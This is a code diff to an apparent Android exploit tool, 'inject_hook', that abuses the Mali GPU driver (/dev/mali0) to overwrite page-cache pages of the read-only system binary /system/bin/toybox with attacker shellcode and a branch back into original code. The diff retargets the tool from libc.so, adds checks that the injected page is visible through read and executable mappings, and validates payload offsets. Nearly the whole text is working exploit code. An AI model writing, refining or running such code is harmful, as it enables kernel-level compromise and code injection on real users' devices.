@@ -92,6 +92,49 @@ static int patch_page(int fd, const char* path, uint64_t page_off, const uint8_t
     job(fd, 0, BASE_JD_REQ_EXTERNAL_RESOURCES|BASE_JD_REQ_SOFT_EVENT_WAIT, (uint64_t)(uintptr_t)jc, (uint64_t)(uintptr_t)cmap);
     memcpy(cmap, newpage, 0x1000);
     __builtin___clear_cache((char*)cmap, (char*)cmap + 0x1000);
+
+    /* ---- VERIFICATION 1: same-fd read-back ----
+     * reads through the SAME fd the primitive used: same mount view,
+     * same page-cache instance. A mismatch here = the write never landed.
+     * A match here + later mismatch in an external dd = two page-cache
+     * views exist for this file. */
+    {
+        uint8_t chk[4096];
+        ssize_t n = pread(f, chk, 0x1000, (off_t)page_off);
+        int same = (n == 0x1000) && (memcmp(chk, newpage, 0x1000) == 0);
+        printf("[%s] verify same-fd page@0x%llx: %s\n",
+               same ? "+" : "-",
+               (unsigned long long)page_off,
+               same ? "PATCHED" : "MISMATCH");
+        if (!same) {
+            /* dump the first differing offset for diagnosis */
+            for (int i = 0; i < 0x1000; i += 4) {
+                if (memcmp(chk + i, newpage + i, 4) != 0) {
+                    printf("    first diff at page+0x%x: have %02x%02x%02x%02x want %02x%02x%02x%02x\n",
+                           i, chk[i], chk[i+1], chk[i+2], chk[i+3],
+                           newpage[i], newpage[i+1], newpage[i+2], newpage[i+3]);
+                    break;
+                }
+            }
+        }
+
+        /* ---- VERIFICATION 2: exec-view probe ----
+         * mmap PROT_EXEC through the same fd: closest a shell process can
+         * get to what the dynamic linker faults. If same-fd says PATCHED
+         * but this says MISMATCH, the code path processes execute is not
+         * the view we patched. */
+        void* v = mmap(NULL, 0x1000, PROT_READ|PROT_EXEC, MAP_PRIVATE, f, (off_t)page_off);
+        if (v != MAP_FAILED) {
+            int ex = memcmp(v, newpage, 0x1000) == 0;
+            printf("[%s] verify exec-view page@0x%llx: %s\n",
+                   ex ? "+" : "-",
+                   (unsigned long long)page_off,
+                   ex ? "PATCHED" : "MISMATCH");
+            munmap(v, 0x1000);
+        } else {
+            printf("[-] verify exec-view: mmap failed errno=%d\n", errno);
+        }
+    }
     close(f);
     return 0;
 }
@@ -102,7 +145,7 @@ int main(int argc, char** argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (argc < 3) { printf("usage: inject_hook place <sc_off> <ph> | hook <target> <sc_off> | restore <target> <insn>\n"); return 1; }
     const char* cmd = argv[1];
-    const char* path = "/system/lib64/libc.so";
+    const char* path = "/system/bin/toybox";
     cpu_set_t cset; CPU_ZERO(&cset); CPU_SET(0, &cset);
     sched_setaffinity(0, sizeof(cset), &cset);
     int fd = open("/dev/mali0", O_RDWR);
@@ -116,14 +159,34 @@ int main(int argc, char** argv) {
         if (!fp) { perror("open shellcode.bin"); return 1; }
         uint8_t sc[4096]; size_t sc_len = fread(sc, 1, sizeof(sc), fp);
         fclose(fp);
+        {
+            uint32_t derived_ph = (uint32_t)(sc_len - 4);
+            if (ph != derived_ph) {
+                printf("[-] REFUSED: ph 0x%x != %zu-4 (0x%x). Mismatched ph corrupts the exit branch.\n",
+                       ph, sc_len, derived_ph);
+                return 1;
+            }
+        }
+        {
+            uint32_t head; memcpy(&head, sc, 4);
+            printf("[+] payload %zu bytes, head=%08x, ph=0x%x\n", sc_len, head, ph);
+        }
+        if (sc_off & 3) {
+            printf("[-] REFUSED: sc_off 0x%llx not 4-aligned\n", (unsigned long long)sc_off);
+            return 1;
+        }
+        printf("[+] payload lands at page+0x%llx\n", (unsigned long long)(sc_off & 0xfff));
         uint32_t back = 0x14000000 | (((int64_t)(hx(argv[4]) - (sc_off + ph)) >> 2) & 0x3ffffff);
         memcpy(sc + ph, &back, 4);
         printf("[+] shellcode %zu bytes, branch-back=0x%08x (-> 0x%llx)\n", sc_len, back, (unsigned long long)hx(argv[4]));
         uint8_t pagebuf[4096];
-        int f = open(path, O_RDONLY);
-        pread(f, pagebuf, sizeof(pagebuf), sc_off & ~0xfffULL);
-        memcpy(pagebuf + (sc_off & 0xfff), sc, sc_len);
+        int f = open("/data/local/tmp/toybox_pristine", O_RDONLY);
+        if (f < 0) { perror("open toybox_pristine"); return 1; }
+        if (pread(f, pagebuf, sizeof(pagebuf), (off_t)(sc_off & ~0xfffULL)) != 0x1000) {
+            printf("[-] short read on pristine page\n"); close(f); return 1;
+        }
         close(f);
+        memcpy(pagebuf + (sc_off & 0xfff), sc, sc_len);
         if (patch_page(fd, path, sc_off & ~0xfffULL, pagebuf)) return 1;
         printf("[+] SHELLCODE PLACED @0x%llx\n", (unsigned long long)sc_off);
     } else if (!strcmp(cmd, "hook")) {
